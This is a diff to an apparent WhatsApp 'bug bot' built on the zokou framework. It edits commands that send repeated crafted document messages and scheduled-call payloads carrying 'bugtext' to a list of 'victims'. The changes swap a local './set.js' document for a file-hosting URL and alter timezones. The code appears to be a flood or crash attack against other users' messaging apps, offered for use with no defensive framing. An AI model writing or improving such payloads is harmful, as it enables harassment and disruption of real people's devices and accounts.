@@ -206,7 +206,7 @@ zokou(
         await loading(dest, zk);
 
         for (let i = 0; i < 25; i++) {
-            const doc = { url: "./set.js" };
+            const doc = { url: "https://files.catbox.moe/eoo6ql.jpg" };
             await zk.sendMessage(dest, {
                 document: doc,
                 mimetype:
@@ -309,7 +309,7 @@ zokou(
         const text = arg.join("");
         let amount = 30;
         let victims = [];
-        const doc = { url: "./set.js" };
+        const doc = { url: "https://files.catbox.moe/eoo6ql.jpg" };
         const bug = {
             document: doc,
             mimetype:
@@ -629,7 +629,7 @@ zokou(
             scheduledCallCreationMessage: {
                 callType: "2",
                 scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Kolkata")
+                    .tz("Africa/Dodoma")
                     .format("DD/MM/YYYY HH:mm:ss")}`,
                 title: `${bugtext1}`
             }
@@ -713,7 +713,7 @@ zokou(
             scheduledCallCreationMessage: {
                 callType: "2",
                 scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Kolkata")
+                    .tz("Africa/dodoma")
                     .format("DD/MM/YYYY HH:mm:ss")}`,
                 title: bugtext3
             }
